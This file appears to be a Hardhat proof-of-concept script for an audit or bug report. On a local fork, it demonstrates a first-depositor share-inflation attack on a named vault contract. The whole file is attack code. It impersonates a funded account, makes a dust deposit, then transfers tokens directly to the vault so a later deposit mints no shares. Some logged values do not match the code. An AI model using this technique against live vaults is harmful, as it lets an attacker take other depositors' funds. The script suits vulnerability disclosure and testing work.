const { ethers } = require("hardhat");

// Fork at current block


async function main() {

    let UnderlyingAbi = [
        "function balanceOf(address _user) view returns (uint256)",
        "function approve(address spender, uint256 amount) external returns (bool)",
        "function transfer(address recipient, uint256 amount) external returns (bool)",
        "function totalSupply() external view returns (uint256)"
    ];

    let sTokenAbi = [
        "function totalSupply() external view returns (uint256)",
        "function balanceOf(address _user) view returns (uint256)",
        "function deposit(uint256 _amount) external",
        "function withdraw(uint256 _shares) external",
    ];

    const provider = new ethers.providers.JsonRpcProvider("http://127.0.0.1:8545/");

    // Getting freezingToken instance (here VaultDodoUsdc)
    const sToken = new ethers.Contract("0x5A06beea8573C59AFe9a15A3f01D6B4505b89339", sTokenAbi, provider);
    
    // Get underlying token instance 
    const Underlying = new ethers.Contract('0x7eBd8a1803cE082d4dE609C0aA0813DD842BD4DB', UnderlyingAbi, provider);

    // Impersonating account which has some underlying tokens
    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: ["0xcb49a0a6b9b6f477130fdc6b0e1dbc92b82399aa"],
      });

    const attacker = await ethers.getSigner("0xcb49a0a6b9b6f477130fdc6b0e1dbc92b82399aa");

    // Getting some eth
    await ethers.provider.send("hardhat_setBalance", [
        attacker.address,
        "0x1158e460913d00000", // 20 ETH
    ]);

    

    console.log('===============================================');
    let beforeAttackBalance = await Underlying.balanceOf(attacker.address);
    console.log('Total supply of sToken at start: ', await sToken.totalSupply());
    console.log('Attacker total underlying balance at start: ', beforeAttackBalance);

    // Approving
    await Underlying.connect(attacker).approve(sToken.address, ethers.utils.parseEther('20'), {gasLimit: 2300000});

    console.log('===============================================');
    console.log('Step 1: Attacker Depositing 1 wei amount of underlying token to mint 1 wei of sToken');
    await sToken.connect(attacker).deposit(8, {gasLimit: 2300000});
    console.log('After depositing total supply of sToken: ', await sToken.totalSupply());
    console.log('sToken balance of attacker after 1st deposit: ', await sToken.balanceOf(attacker.address));
    
    console.log('===============================================');
    console.log('Step 2: Transferring underlying directly to sToken, z = 10 token');
    await Underlying.connect(attacker).transfer(sToken.address, ethers.utils.parseUnits('10', 6), {gasLimit: 23000000});

    console.log('After transferring total supply of sToken: ', await sToken.totalSupply());

    // // Depositing with amount < z
    // /**
    //  * Here in ideal case user should get some sToken.
    //  * But here user gets zero as attacker have transferred some amount of Underlying token directly to contract address
    //  */
    console.log('===============================================');
    console.log('Depositing with less than z after attack....');
    await sToken.connect(attacker).deposit(ethers.utils.parseUnits('5', 6), {gasLimit: 2300000});
    const sTokenTotalSupplyAfterUserDeposit = await sToken.totalSupply();
    console.log('sToken balance of attacker after 2nd deposit: ', await sToken.balanceOf(attacker.address));

    // // No Share should be added. So before and after should be equal
    console.log('Final Total Supply: ', sTokenTotalSupplyAfterUserDeposit);

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    })